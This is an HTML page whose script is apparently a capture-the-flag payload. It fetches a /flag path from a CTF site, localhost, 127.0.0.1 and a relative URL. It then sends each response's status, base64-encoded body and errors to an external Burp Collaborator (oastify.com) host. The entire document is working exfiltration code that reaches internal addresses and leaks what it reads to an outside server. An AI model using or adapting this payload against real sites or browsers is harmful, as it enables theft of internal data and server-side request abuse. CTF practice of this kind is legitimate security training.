<!DOCTYPE html>
<html>
<body>
<script>
const COLLAB = '2qtlswel63wrj1qjdfgmz4y59wfq3hr6.oastify.com';

// Test what happens when we fetch different URLs
const testUrls = [
    'https://www.chaitanyactf.me/flag',
    'http://localhost/flag',
    'http://127.0.0.1/flag',
    '/flag'  // Relative path - maybe it works?
];

testUrls.forEach((url, index) => {
    setTimeout(() => {
        fetch(url)
            .then(response => {
                // Send status code and headers to collaborator
                fetch(`https://${COLLAB}/?url=${btoa(url)}&status=${response.status}&ok=${response.ok}`);
                return response.text();
            })
            .then(data => {
                if (data) {
                    fetch(`https://${COLLAB}/?success=${btoa(data)}&from=${btoa(url)}`);
                }
            })
            .catch(error => {
                fetch(`https://${COLLAB}/?error=${encodeURIComponent(error.message)}&url=${btoa(url)}`);
            });
    }, index * 2000);
});
</script>
</body>
</html>
